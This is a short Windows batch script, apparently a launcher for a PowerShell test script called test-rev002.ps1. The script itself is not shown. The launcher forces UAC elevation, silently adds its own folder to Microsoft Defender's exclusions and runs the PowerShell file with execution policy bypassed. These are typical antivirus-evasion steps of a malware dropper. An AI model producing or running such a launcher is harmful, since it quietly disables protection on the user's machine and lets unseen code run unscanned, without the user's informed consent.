@echo off
REM test-rev002-elevated.cmd - relaunch itself elevated (UAC), then run test-rev002.ps1
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -NoProfile -Command "Start-Process '%~f0' -Verb RunAs"
  exit /b
)
cd /d "%~dp0"
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0test-rev002.ps1"
